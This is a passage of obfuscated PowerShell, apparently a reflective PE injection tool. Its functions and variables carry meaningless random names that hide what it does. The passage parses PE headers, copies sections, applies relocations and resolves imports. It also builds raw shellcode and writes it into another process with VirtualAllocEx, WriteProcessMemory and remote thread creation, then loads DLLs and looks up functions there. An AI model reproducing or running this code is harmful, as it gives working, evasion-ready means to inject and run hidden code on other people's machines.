        $pSSMvuZf99 = iced -IzMDqdqW99 $IzMDqdqW99 -XdmAcKgP99 $XdmAcKgP99
        
        $PEInfo | Add-Member -MemberType NoteProperty -Name PEHandle -Value $IzMDqdqW99
        $PEInfo | Add-Member -MemberType NoteProperty -Name IMAGE_NT_HEADERS -Value ($pSSMvuZf99.IMAGE_NT_HEADERS)
        $PEInfo | Add-Member -MemberType NoteProperty -Name NtHeadersPtr -Value ($pSSMvuZf99.NtHeadersPtr)
        $PEInfo | Add-Member -MemberType NoteProperty -Name PE64Bit -Value ($pSSMvuZf99.PE64Bit)
        $PEInfo | Add-Member -MemberType NoteProperty -Name 'SizeOfImage' -Value ($pSSMvuZf99.IMAGE_NT_HEADERS.OptionalHeader.SizeOfImage)
        
        if ($PEInfo.PE64Bit -eq $true)
        {
            [IntPtr]$INMXnVsM99 = [IntPtr](forecastles ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$XdmAcKgP99.IMAGE_NT_HEADERS64)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $INMXnVsM99
        }
        else
        {
            [IntPtr]$INMXnVsM99 = [IntPtr](forecastles ([Int64]$PEInfo.NtHeadersPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$XdmAcKgP99.IMAGE_NT_HEADERS32)))
            $PEInfo | Add-Member -MemberType NoteProperty -Name SectionHeaderPtr -Value $INMXnVsM99
        }
        
        if (($pSSMvuZf99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_DLL) -eq $Win32Constants.IMAGE_FILE_DLL)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'DLL'
        }
        elseif (($pSSMvuZf99.IMAGE_NT_HEADERS.FileHeader.Characteristics -band $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE) -eq $Win32Constants.IMAGE_FILE_EXECUTABLE_IMAGE)
        {
            $PEInfo | Add-Member -MemberType NoteProperty -Name FileType -Value 'EXE'
        }
        else
        {
            Throw "PE file is not an EXE or DLL"
        }
        
        return $PEInfo
    }
    
    
    Function curries
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $saVngXfx99,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ZKINaRCl99
        )
        
        $HBzQDdli99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        
        $gLrXZELS99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ZKINaRCl99)
        $TeWMHFKW99 = [UIntPtr][UInt64]([UInt64]$gLrXZELS99.Length + 1)
        $uDOjTvvg99 = $ocxmKEPE99.VirtualAllocEx.Invoke($saVngXfx99, [IntPtr]::Zero, $TeWMHFKW99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($uDOjTvvg99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }
        [UIntPtr]$BOGmSWJa99 = [UIntPtr]::Zero
        $ZYkkiHnC99 = $ocxmKEPE99.WriteProcessMemory.Invoke($saVngXfx99, $uDOjTvvg99, $ZKINaRCl99, $TeWMHFKW99, [Ref]$BOGmSWJa99)
        
        if ($ZYkkiHnC99 -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($TeWMHFKW99 -ne $BOGmSWJa99)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $KuYoEJjN99 = $ocxmKEPE99.GetModuleHandle.Invoke("kernel32.dll")
        $yyFvEPqv99 = $ocxmKEPE99.GetProcAddress.Invoke($KuYoEJjN99, "LoadLibraryA") #Kernel32 loaded to the same address for all processes
        
        [IntPtr]$oBIGAlgn99 = [IntPtr]::Zero
        if ($PEInfo.PE64Bit -eq $true)
        {
            $miDvlgbH99 = $ocxmKEPE99.VirtualAllocEx.Invoke($saVngXfx99, [IntPtr]::Zero, $TeWMHFKW99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            if ($miDvlgbH99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for the return value of LoadLibraryA"
            }
            
            
            $KlpjxrIW99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $VdOUEGCm99 = @(0x48, 0xba)
            $KqaUJyMk99 = @(0xff, 0xd2, 0x48, 0xba)
            $yqokTppa99 = @(0x48, 0x89, 0x02, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
            
            $vpLElTks99 = $KlpjxrIW99.Length + $VdOUEGCm99.Length + $KqaUJyMk99.Length + $yqokTppa99.Length + ($HBzQDdli99 * 3)
            $deppxZuZ99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($vpLElTks99)
            $TqHcjJFG99 = $deppxZuZ99
            
            costarring -Bytes $KlpjxrIW99 -echyVupw99 $deppxZuZ99
            $deppxZuZ99 = forecastles $deppxZuZ99 ($KlpjxrIW99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($uDOjTvvg99, $deppxZuZ99, $false)
            $deppxZuZ99 = forecastles $deppxZuZ99 ($HBzQDdli99)
            costarring -Bytes $VdOUEGCm99 -echyVupw99 $deppxZuZ99
            $deppxZuZ99 = forecastles $deppxZuZ99 ($VdOUEGCm99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($yyFvEPqv99, $deppxZuZ99, $false)
            $deppxZuZ99 = forecastles $deppxZuZ99 ($HBzQDdli99)
            costarring -Bytes $KqaUJyMk99 -echyVupw99 $deppxZuZ99
            $deppxZuZ99 = forecastles $deppxZuZ99 ($KqaUJyMk99.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($miDvlgbH99, $deppxZuZ99, $false)
            $deppxZuZ99 = forecastles $deppxZuZ99 ($HBzQDdli99)
            costarring -Bytes $yqokTppa99 -echyVupw99 $deppxZuZ99
            $deppxZuZ99 = forecastles $deppxZuZ99 ($yqokTppa99.Length)
            
            $ULbprPTI99 = $ocxmKEPE99.VirtualAllocEx.Invoke($saVngXfx99, [IntPtr]::Zero, [UIntPtr][UInt64]$vpLElTks99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($ULbprPTI99 -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process for shellcode"
            }
            
            $ZYkkiHnC99 = $ocxmKEPE99.WriteProcessMemory.Invoke($saVngXfx99, $ULbprPTI99, $TqHcjJFG99, [UIntPtr][UInt64]$vpLElTks99, [Ref]$BOGmSWJa99)
            if (($ZYkkiHnC99 -eq $false) -or ([UInt64]$BOGmSWJa99 -ne [UInt64]$vpLElTks99))
            {
                Throw "Unable to write shellcode to remote process memory."
            }
            
            $sfHoDRoM99 = firewater -sHbeaXaO99 $saVngXfx99 -StartAddress $ULbprPTI99 -ocxmKEPE99 $ocxmKEPE99
            $RtFnvHTY99 = $ocxmKEPE99.WaitForSingleObject.Invoke($sfHoDRoM99, 20000)
            if ($RtFnvHTY99 -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            [IntPtr]$yNxwlWcc99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($HBzQDdli99)
            $RtFnvHTY99 = $ocxmKEPE99.ReadProcessMemory.Invoke($saVngXfx99, $miDvlgbH99, $yNxwlWcc99, [UIntPtr][UInt64]$HBzQDdli99, [Ref]$BOGmSWJa99)
            if ($RtFnvHTY99 -eq $false)
            {
                Throw "Call to ReadProcessMemory failed"
            }
            [IntPtr]$oBIGAlgn99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($yNxwlWcc99, [Type][IntPtr])
            $ocxmKEPE99.VirtualFreeEx.Invoke($saVngXfx99, $miDvlgbH99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
            $ocxmKEPE99.VirtualFreeEx.Invoke($saVngXfx99, $ULbprPTI99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        }
        else
        {
            [IntPtr]$sfHoDRoM99 = firewater -sHbeaXaO99 $saVngXfx99 -StartAddress $yyFvEPqv99 -ocRuxzzh99 $uDOjTvvg99 -ocxmKEPE99 $ocxmKEPE99
            $RtFnvHTY99 = $ocxmKEPE99.WaitForSingleObject.Invoke($sfHoDRoM99, 20000)
            if ($RtFnvHTY99 -ne 0)
            {
                Throw "Call to CreateRemoteThread to call GetProcAddress failed."
            }
            
            [Int32]$phUWpEku99 = 0
            $RtFnvHTY99 = $ocxmKEPE99.GetExitCodeThread.Invoke($sfHoDRoM99, [Ref]$phUWpEku99)
            if (($RtFnvHTY99 -eq 0) -or ($phUWpEku99 -eq 0))
            {
                Throw "Call to GetExitCodeThread failed"
            }
            
            [IntPtr]$oBIGAlgn99 = [IntPtr]$phUWpEku99
        }
        
        $ocxmKEPE99.VirtualFreeEx.Invoke($saVngXfx99, $uDOjTvvg99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $oBIGAlgn99
    }
    
    
    Function prissy
    {
        Param(
        [Parameter(Position=0, Mandatory=$true)]
        [IntPtr]
        $saVngXfx99,
        
        [Parameter(Position=1, Mandatory=$true)]
        [IntPtr]
        $ZEzOKiTU99,
        
        [Parameter(Position=2, Mandatory=$true)]
        [String]
        $FunctionName
        )
        $HBzQDdli99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        $kZpywArZ99 = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($FunctionName)
        
        $zwynwhru99 = [UIntPtr][UInt64]([UInt64]$FunctionName.Length + 1)
        $IWgaXwuD99 = $ocxmKEPE99.VirtualAllocEx.Invoke($saVngXfx99, [IntPtr]::Zero, $zwynwhru99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($IWgaXwuD99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process"
        }
        [UIntPtr]$BOGmSWJa99 = [UIntPtr]::Zero
        $ZYkkiHnC99 = $ocxmKEPE99.WriteProcessMemory.Invoke($saVngXfx99, $IWgaXwuD99, $kZpywArZ99, $zwynwhru99, [Ref]$BOGmSWJa99)
        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($kZpywArZ99)
        if ($ZYkkiHnC99 -eq $false)
        {
            Throw "Unable to write DLL path to remote process memory"
        }
        if ($zwynwhru99 -ne $BOGmSWJa99)
        {
            Throw "Didn't write the expected amount of bytes when writing a DLL path to load to the remote process"
        }
        
        $KuYoEJjN99 = $ocxmKEPE99.GetModuleHandle.Invoke("kernel32.dll")
        $ITUgvcQp99 = $ocxmKEPE99.GetProcAddress.Invoke($KuYoEJjN99, "GetProcAddress") #Kernel32 loaded to the same address for all processes
        
        $AdlHoGia99 = $ocxmKEPE99.VirtualAllocEx.Invoke($saVngXfx99, [IntPtr]::Zero, [UInt64][UInt64]$HBzQDdli99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
        if ($AdlHoGia99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for the return value of GetProcAddress"
        }
        
        
        [Byte[]]$hgmbWmKD99 = @()
        if ($PEInfo.PE64Bit -eq $true)
        {
            $GyJnsJIR99 = @(0x53, 0x48, 0x89, 0xe3, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xb9)
            $dOzeNNwO99 = @(0x48, 0xba)
            $LVbGbRKn99 = @(0x48, 0xb8)
            $twCrkNdx99 = @(0xff, 0xd0, 0x48, 0xb9)
            $CPcvUPkw99 = @(0x48, 0x89, 0x01, 0x48, 0x89, 0xdc, 0x5b, 0xc3)
        }
        else
        {
            $GyJnsJIR99 = @(0x53, 0x89, 0xe3, 0x83, 0xe4, 0xc0, 0xb8)
            $dOzeNNwO99 = @(0xb9)
            $LVbGbRKn99 = @(0x51, 0x50, 0xb8)
            $twCrkNdx99 = @(0xff, 0xd0, 0xb9)
            $CPcvUPkw99 = @(0x89, 0x01, 0x89, 0xdc, 0x5b, 0xc3)
        }
        $vpLElTks99 = $GyJnsJIR99.Length + $dOzeNNwO99.Length + $LVbGbRKn99.Length + $twCrkNdx99.Length + $CPcvUPkw99.Length + ($HBzQDdli99 * 4)
        $deppxZuZ99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($vpLElTks99)
        $TqHcjJFG99 = $deppxZuZ99
        
        costarring -Bytes $GyJnsJIR99 -echyVupw99 $deppxZuZ99
        $deppxZuZ99 = forecastles $deppxZuZ99 ($GyJnsJIR99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($ZEzOKiTU99, $deppxZuZ99, $false)
        $deppxZuZ99 = forecastles $deppxZuZ99 ($HBzQDdli99)
        costarring -Bytes $dOzeNNwO99 -echyVupw99 $deppxZuZ99
        $deppxZuZ99 = forecastles $deppxZuZ99 ($dOzeNNwO99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($IWgaXwuD99, $deppxZuZ99, $false)
        $deppxZuZ99 = forecastles $deppxZuZ99 ($HBzQDdli99)
        costarring -Bytes $LVbGbRKn99 -echyVupw99 $deppxZuZ99
        $deppxZuZ99 = forecastles $deppxZuZ99 ($LVbGbRKn99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($ITUgvcQp99, $deppxZuZ99, $false)
        $deppxZuZ99 = forecastles $deppxZuZ99 ($HBzQDdli99)
        costarring -Bytes $twCrkNdx99 -echyVupw99 $deppxZuZ99
        $deppxZuZ99 = forecastles $deppxZuZ99 ($twCrkNdx99.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($AdlHoGia99, $deppxZuZ99, $false)
        $deppxZuZ99 = forecastles $deppxZuZ99 ($HBzQDdli99)
        costarring -Bytes $CPcvUPkw99 -echyVupw99 $deppxZuZ99
        $deppxZuZ99 = forecastles $deppxZuZ99 ($CPcvUPkw99.Length)
        
        $ULbprPTI99 = $ocxmKEPE99.VirtualAllocEx.Invoke($saVngXfx99, [IntPtr]::Zero, [UIntPtr][UInt64]$vpLElTks99, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
        if ($ULbprPTI99 -eq [IntPtr]::Zero)
        {
            Throw "Unable to allocate memory in the remote process for shellcode"
        }
        
        $ZYkkiHnC99 = $ocxmKEPE99.WriteProcessMemory.Invoke($saVngXfx99, $ULbprPTI99, $TqHcjJFG99, [UIntPtr][UInt64]$vpLElTks99, [Ref]$BOGmSWJa99)
        if (($ZYkkiHnC99 -eq $false) -or ([UInt64]$BOGmSWJa99 -ne [UInt64]$vpLElTks99))
        {
            Throw "Unable to write shellcode to remote process memory."
        }
        
        $sfHoDRoM99 = firewater -sHbeaXaO99 $saVngXfx99 -StartAddress $ULbprPTI99 -ocxmKEPE99 $ocxmKEPE99
        $RtFnvHTY99 = $ocxmKEPE99.WaitForSingleObject.Invoke($sfHoDRoM99, 20000)
        if ($RtFnvHTY99 -ne 0)
        {
            Throw "Call to CreateRemoteThread to call GetProcAddress failed."
        }
        
        [IntPtr]$yNxwlWcc99 = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($HBzQDdli99)
        $RtFnvHTY99 = $ocxmKEPE99.ReadProcessMemory.Invoke($saVngXfx99, $AdlHoGia99, $yNxwlWcc99, [UIntPtr][UInt64]$HBzQDdli99, [Ref]$BOGmSWJa99)
        if (($RtFnvHTY99 -eq $false) -or ($BOGmSWJa99 -eq 0))
        {
            Throw "Call to ReadProcessMemory failed"
        }
        [IntPtr]$UujBqImL99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($yNxwlWcc99, [Type][IntPtr])
        $ocxmKEPE99.VirtualFreeEx.Invoke($saVngXfx99, $ULbprPTI99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $ocxmKEPE99.VirtualFreeEx.Invoke($saVngXfx99, $IWgaXwuD99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        $ocxmKEPE99.VirtualFreeEx.Invoke($saVngXfx99, $AdlHoGia99, [UIntPtr][UInt64]0, $Win32Constants.MEM_RELEASE) | Out-Null
        
        return $UujBqImL99
    }
    Function opinionated
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Byte[]]
        $VPcmXnGz99,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $ocxmKEPE99,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $XdmAcKgP99
        )
        
        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$INMXnVsM99 = [IntPtr](forecastles ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$XdmAcKgP99.IMAGE_SECTION_HEADER)))
            $lrScHDCB99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($INMXnVsM99, [Type]$XdmAcKgP99.IMAGE_SECTION_HEADER)
        
            [IntPtr]$TVrbiHLJ99 = [IntPtr](forecastles ([Int64]$PEInfo.PEHandle) ([Int64]$lrScHDCB99.VirtualAddress))
            
            $pnFdqpvy99 = $lrScHDCB99.SizeOfRawData
            if ($lrScHDCB99.PointerToRawData -eq 0)
            {
                $pnFdqpvy99 = 0
            }
            
            if ($pnFdqpvy99 -gt $lrScHDCB99.VirtualSize)
            {
                $pnFdqpvy99 = $lrScHDCB99.VirtualSize
            }
            
            if ($pnFdqpvy99 -gt 0)
            {
                Mormon -BYtPotTf99 "opinionated::MarshalCopy" -PEInfo $PEInfo -StartAddress $TVrbiHLJ99 -Size $pnFdqpvy99 | Out-Null
                [System.Runtime.InteropServices.Marshal]::Copy($VPcmXnGz99, [Int32]$lrScHDCB99.PointerToRawData, $TVrbiHLJ99, $pnFdqpvy99)
            }
        
            if ($lrScHDCB99.SizeOfRawData -lt $lrScHDCB99.VirtualSize)
            {
                $jdwbFwVr99 = $lrScHDCB99.VirtualSize - $pnFdqpvy99
                [IntPtr]$StartAddress = [IntPtr](forecastles ([Int64]$TVrbiHLJ99) ([Int64]$pnFdqpvy99))
                Mormon -BYtPotTf99 "opinionated::Memset" -PEInfo $PEInfo -StartAddress $StartAddress -Size $jdwbFwVr99 | Out-Null
                $ocxmKEPE99.memset.Invoke($StartAddress, 0, [IntPtr]$jdwbFwVr99) | Out-Null
            }
        }
    }
    Function comity
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [Int64]
        $tZDALMMB99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $XdmAcKgP99
        )
        
        [Int64]$MZIvGvkf99 = 0
        $sbNWuXtx99 = $true #Track if the difference variable should be added or subtracted from variables
        [UInt32]$RAeuIjmC99 = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$XdmAcKgP99.IMAGE_BASE_RELOCATION)
        
        if (($tZDALMMB99 -eq [Int64]$PEInfo.EffectivePEHandle) `
                -or ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.Size -eq 0))
        {
            return
        }
        elseif ((commandos ($tZDALMMB99) ($PEInfo.EffectivePEHandle)) -eq $true)
        {
            $MZIvGvkf99 = rapist ($tZDALMMB99) ($PEInfo.EffectivePEHandle)
            $sbNWuXtx99 = $false
        }
        elseif ((commandos ($PEInfo.EffectivePEHandle) ($tZDALMMB99)) -eq $true)
        {
            $MZIvGvkf99 = rapist ($PEInfo.EffectivePEHandle) ($tZDALMMB99)
        }
        
        [IntPtr]$mSoAxBRN99 = [IntPtr](forecastles ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.BaseRelocationTable.VirtualAddress))
        while($true)
        {
            $QnwPRdvH99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($mSoAxBRN99, [Type]$XdmAcKgP99.IMAGE_BASE_RELOCATION)
            if ($QnwPRdvH99.SizeOfBlock -eq 0)
            {
                break
            }
            [IntPtr]$BnzLopSW99 = [IntPtr](forecastles ([Int64]$PEInfo.PEHandle) ([Int64]$QnwPRdvH99.VirtualAddress))
            $kyvyItzT99 = ($QnwPRdvH99.SizeOfBlock - $RAeuIjmC99) / 2
            for($i = 0; $i -lt $kyvyItzT99; $i++)
            {
                $uLxPfyuz99 = [IntPtr](forecastles ([IntPtr]$mSoAxBRN99) ([Int64]$RAeuIjmC99 + (2 * $i)))
                [UInt16]$WkaCuUJz99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($uLxPfyuz99, [Type][UInt16])
                [UInt16]$VALDhmhn99 = $WkaCuUJz99 -band 0x0FFF
                [UInt16]$BwYZEybQ99 = $WkaCuUJz99 -band 0xF000
                for ($j = 0; $j -lt 12; $j++)
                {
                    $BwYZEybQ99 = [Math]::Floor($BwYZEybQ99 / 2)
                }
                if (($BwYZEybQ99 -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                        -or ($BwYZEybQ99 -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
                {           
                    [IntPtr]$ZWeqEjfi99 = [IntPtr](forecastles ([Int64]$BnzLopSW99) ([Int64]$VALDhmhn99))
                    [IntPtr]$GdHxrwGM99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ZWeqEjfi99, [Type][IntPtr])
        
                    if ($sbNWuXtx99 -eq $true)
                    {
                        [IntPtr]$GdHxrwGM99 = [IntPtr](forecastles ([Int64]$GdHxrwGM99) ($MZIvGvkf99))
                    }
                    else
                    {
                        [IntPtr]$GdHxrwGM99 = [IntPtr](rapist ([Int64]$GdHxrwGM99) ($MZIvGvkf99))
                    }               
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($GdHxrwGM99, $ZWeqEjfi99, $false) | Out-Null
                }
                elseif ($BwYZEybQ99 -ne $Win32Constants.IMAGE_REL_BASED_ABSOLUTE)
                {
                    Throw "Unknown relocation found, relocation value: $BwYZEybQ99, relocationinfo: $WkaCuUJz99"
                }
            }
            
            $mSoAxBRN99 = [IntPtr](forecastles ([Int64]$mSoAxBRN99) ([Int64]$QnwPRdvH99.SizeOfBlock))
        }
    }
    Function exile
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $ocxmKEPE99,
        
        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $XdmAcKgP99,
        
        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Constants,
        
        [Parameter(Position = 4, Mandatory = $false)]
        [IntPtr]
        $saVngXfx99
        )
        
        $RSymZJNq99 = $false
        if ($PEInfo.PEHandle -ne $PEInfo.EffectivePEHandle)
        {
            $RSymZJNq99 = $true
        }
        
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.Size -gt 0)
        {
            [IntPtr]$IBnDPehj99 = forecastles ([Int64]$PEInfo.PEHandle) ([Int64]$PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ImportTable.VirtualAddress)
            
            while ($true)
            {
                $pOBXpEcy99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($IBnDPehj99, [Type]$XdmAcKgP99.IMAGE_IMPORT_DESCRIPTOR)
                
                if ($pOBXpEcy99.Characteristics -eq 0 `
                        -and $pOBXpEcy99.FirstThunk -eq 0 `
                        -and $pOBXpEcy99.ForwarderChain -eq 0 `
                        -and $pOBXpEcy99.Name -eq 0 `
                        -and $pOBXpEcy99.TimeDateStamp -eq 0)
                {
                    Write-Verbose "Done importing DLL imports"
                    break
                }
                $fjeFeGFd99 = [IntPtr]::Zero
                $ZKINaRCl99 = (forecastles ([Int64]$PEInfo.PEHandle) ([Int64]$pOBXpEcy99.Name))
                $gLrXZELS99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($ZKINaRCl99)
                
                if ($RSymZJNq99 -eq $true)
                {
                    $fjeFeGFd99 = curries -saVngXfx99 $saVngXfx99 -ZKINaRCl99 $ZKINaRCl99
                }
                else
                {
                    $fjeFeGFd99 = $ocxmKEPE99.LoadLibrary.Invoke($gLrXZELS99)
                }
                if (($fjeFeGFd99 -eq $null) -or ($fjeFeGFd99 -eq [IntPtr]::Zero))
                {
                    throw "Error importing DLL, DLLName: $gLrXZELS99"
                }
                
                [IntPtr]$lPgzfUCP99 = forecastles ($PEInfo.PEHandle) ($pOBXpEcy99.FirstThunk)
                [IntPtr]$ArlTWNhA99 = forecastles ($PEInfo.PEHandle) ($pOBXpEcy99.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$HayghEzu99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ArlTWNhA99, [Type][IntPtr])
                
                while ($HayghEzu99 -ne [IntPtr]::Zero)
                {
                    $YsodbRsj99 = ''
                    [IntPtr]$CFetvoDZ99 = [IntPtr]::Zero
                    if([Int64]$HayghEzu99 -lt 0)
                    {
                        $YsodbRsj99 = [Int64]$HayghEzu99 -band 0xffff #This is actually a lookup by ordinal
                    }
                    else
                    {
                        [IntPtr]$lYseMDmu99 = forecastles ($PEInfo.PEHandle) ($HayghEzu99)
                        $lYseMDmu99 = forecastles $lYseMDmu99 ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $YsodbRsj99 = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($lYseMDmu99)
                    }
                    
                    if ($RSymZJNq99 -eq $true)
                    {
                        [IntPtr]$CFetvoDZ99 = prissy -saVngXfx99 $saVngXfx99 -ZEzOKiTU99 $fjeFeGFd99 -FunctionName $YsodbRsj99
                    }
                    else
                    {
                        if($YsodbRsj99 -is [string])
                        {
                            [IntPtr]$CFetvoDZ99 = $ocxmKEPE99.GetProcAddress.Invoke($fjeFeGFd99, $YsodbRsj99)
                        }
                        else
                        {
                            [IntPtr]$CFetvoDZ99 = $ocxmKEPE99.GetProcAddressOrdinal.Invoke($fjeFeGFd99, $YsodbRsj99)
                        }
                    }
                    
                    if ($CFetvoDZ99 -eq $null -or $CFetvoDZ99 -eq [IntPtr]::Zero)
                    {
                        Throw "New function reference is null, this is almost certainly a bug in this script. Function: $YsodbRsj99. Dll: $gLrXZELS99"
                    }
                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($CFetvoDZ99, $lPgzfUCP99, $false)
                    
                    $lPgzfUCP99 = forecastles ([Int64]$lPgzfUCP99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$ArlTWNhA99 = forecastles ([Int64]$ArlTWNhA99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$HayghEzu99 = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ArlTWNhA99, [Type][IntPtr])
                }
                
                $IBnDPehj99 = forecastles ($IBnDPehj99) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$XdmAcKgP99.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }
    Function hallways
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $INUJPKGn99
        )
        
        $WSjgazuq99 = 0x0
        if (($INUJPKGn99 -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($INUJPKGn99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($INUJPKGn99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $WSjgazuq99 = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $WSjgazuq99 = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($INUJPKGn99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $WSjgazuq99 = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $WSjgazuq99 = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($INUJPKGn99 -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($INUJPKGn99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $WSjgazuq99 = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $WSjgazuq99 = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($INUJPKGn99 -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $WSjgazuq99 = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $WSjgazuq99 = $Win32Constants.PAGE_NOACCESS
                }
            }
        }
        
        if (($INUJPKGn99 -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $WSjgazuq99 = $WSjgazuq99 -bor $Win32Constants.PAGE_NOCACHE
        }
        
        return $WSjgazuq99
    }
    Function egos
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,
        
        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $ocxmKEPE99,
        
